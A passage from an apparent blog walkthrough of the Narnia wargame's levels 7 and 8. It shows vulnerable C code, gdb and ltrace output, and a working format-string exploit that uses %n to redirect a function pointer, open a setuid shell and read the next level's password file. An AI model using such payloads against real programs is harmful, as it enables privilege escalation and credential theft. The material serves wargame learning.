&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;fprintf(stderr,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s &amp;lt;buffer&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(vuln(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]));&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Welcome to the goodfunction, but i said the Hackedfunction..&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Way to go!!!!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The presence of &lt;code&gt;snprintf&lt;/code&gt; indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&amp;rsquo;s attack this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &amp;lt;+0&amp;gt;:	push   %ebp
   0x080485ce &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x080485d0 &amp;lt;+3&amp;gt;:	sub    $0xa8,%esp
   0x080485d6 &amp;lt;+9&amp;gt;:	movl   $0x80,0x8(%esp)
   0x080485de &amp;lt;+17&amp;gt;:	movl   $0x0,0x4(%esp)
   0x080485e6 &amp;lt;+25&amp;gt;:	lea    -0x88(%ebp),%eax
   0x080485ec &amp;lt;+31&amp;gt;:	mov    %eax,(%esp)
   0x080485ef &amp;lt;+34&amp;gt;:	call   0x80484b0 &amp;lt;memset@plt&amp;gt;
   0x080485f4 &amp;lt;+39&amp;gt;:	movl   $0x80486e0,0x4(%esp)
   0x080485fc &amp;lt;+47&amp;gt;:	movl   $0x80487d0,(%esp)
   0x08048603 &amp;lt;+54&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048608 &amp;lt;+59&amp;gt;:	movl   $0x8048706,0x4(%esp)
   0x08048610 &amp;lt;+67&amp;gt;:	movl   $0x80487e5,(%esp)
   0x08048617 &amp;lt;+74&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x0804861c &amp;lt;+79&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &amp;lt;+89&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804862c &amp;lt;+95&amp;gt;:	lea    -0x8c(%ebp),%edx
   0x08048632 &amp;lt;+101&amp;gt;:	mov    %edx,0x8(%esp)
   0x08048636 &amp;lt;+105&amp;gt;:	mov    %eax,0x4(%esp)
   0x0804863a &amp;lt;+109&amp;gt;:	movl   $0x80487fd,(%esp)
   0x08048641 &amp;lt;+116&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048646 &amp;lt;+121&amp;gt;:	movl   $0x8048818,(%esp)
   0x0804864d &amp;lt;+128&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x08048652 &amp;lt;+133&amp;gt;:	movl   $0x2,(%esp)
   0x08048659 &amp;lt;+140&amp;gt;:	call   0x8048440 &amp;lt;sleep@plt&amp;gt;
   0x0804865e &amp;lt;+145&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &amp;lt;+155&amp;gt;:	mov    0x8(%ebp),%eax
   0x0804866b &amp;lt;+158&amp;gt;:	mov    %eax,0x8(%esp)
   0x0804866f &amp;lt;+162&amp;gt;:	movl   $0x80,0x4(%esp)
   0x08048677 &amp;lt;+170&amp;gt;:	lea    -0x88(%ebp),%eax
   0x0804867d &amp;lt;+176&amp;gt;:	mov    %eax,(%esp)
   0x08048680 &amp;lt;+179&amp;gt;:	call   0x80484c0 &amp;lt;snprintf@plt&amp;gt;
   0x08048685 &amp;lt;+184&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804868b &amp;lt;+190&amp;gt;:	call   *%eax
   0x0804868d &amp;lt;+192&amp;gt;:	leave  
   0x0804868e &amp;lt;+193&amp;gt;:	ret    
End of assembler dump.
(gdb) break *0x08048685
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So disassmble the &lt;code&gt;vuln&lt;/code&gt; function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of &lt;code&gt;%x&lt;/code&gt; you need. Using
&lt;code&gt;ltrace&lt;/code&gt; it&amp;rsquo;s possible to increment the number of &lt;code&gt;%x&lt;/code&gt;&amp;rsquo;s until you
see your string in the output again. I&amp;rsquo;ll paste only the correcy output here&lt;/p&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ ltrace ./narnia7 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;`&lt;/span&gt;
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &amp;lt;unfinished ...&amp;gt;
memset(0xffffd630, &amp;#39;\0&amp;#39;, 128)                                = 0xffffd630
printf(&amp;quot;goodfunction() = %p\n&amp;quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&amp;quot;hackedfunction() = %p\n\n&amp;quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&amp;quot;before : ptrf() = %p (%p)\n&amp;quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&amp;quot;I guess you want to come to the &amp;quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&amp;quot;aaaabbbb8048238ffffd688f7ffda940&amp;quot;..., 128, &amp;quot;aaaabbbb%x%x%x%x%x%x%x&amp;quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&amp;quot;Welcome to the goodfunction, but&amp;quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &amp;lt;no return ...&amp;gt;
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;You can see the &lt;em&gt;aaaa&lt;/em&gt; and &lt;em&gt;bbbb&lt;/em&gt; at line 14. So we have 7 &lt;code&gt;%x&lt;/code&gt; to get the second value.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s take a look at the stack with that input&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631
0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So at &lt;code&gt;0xffffd60c&lt;/code&gt; is the address of &lt;code&gt;goodfunction&lt;/code&gt;. We need to overwrite that
to point to &lt;code&gt;0x8048706&lt;/code&gt;, our &lt;code&gt;hackedfunction&lt;/code&gt;. So as before in &lt;a href=&#34;http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05&#34;&gt;level 05&lt;/a&gt;
we use &lt;code&gt;%n&lt;/code&gt; to try and overwrite this value.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The value of &lt;em&gt;2f&lt;/em&gt; at &lt;code&gt;0xffffd60c&lt;/code&gt; shows us that our overwrite was successful
and we wrote the value of &lt;em&gt;47&lt;/em&gt;. We need to write &lt;code&gt;0x8048706&lt;/code&gt; which is &lt;em&gt;134514438&lt;/em&gt; in decimal.
So let&amp;rsquo;s add our &lt;code&gt;%d&lt;/code&gt; in and remember to adjust the number of &lt;code&gt;%x&lt;/code&gt;s too, so we can see
how much padding we need&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137
0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, so &lt;code&gt;0x8048706 - 0x00000031 = 0x80486d6&lt;/code&gt; or &lt;em&gt;134514389&lt;/em&gt; in decimal.
Let&amp;rsquo;s see if I&amp;rsquo;m right&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Still a little off. Adjusting the value again&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
(gdb) c
Continuing.
Way to go!!!!$
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And now we need to run it from the commandline to actually get a proper setuid shell&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x1c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Notice that the address of &lt;code&gt;ptrf&lt;/code&gt; is not the same in the shell :)&lt;/p&gt;

&lt;h2 id=&#34;level-08:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// gcc&amp;#39;s variable reordering fucked things up&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// to keep the level in its old style i am &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// making &amp;quot;i&amp;quot; global unti i find a fix &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// -morla &lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt; 

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;func&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #75715e&#34;&gt;//int i=0;&lt;/span&gt;
    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(bok,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(bok));&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[i]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i];&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,bok);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;       
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;func(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m struggling with this, and rather than delay the whole post because of the last
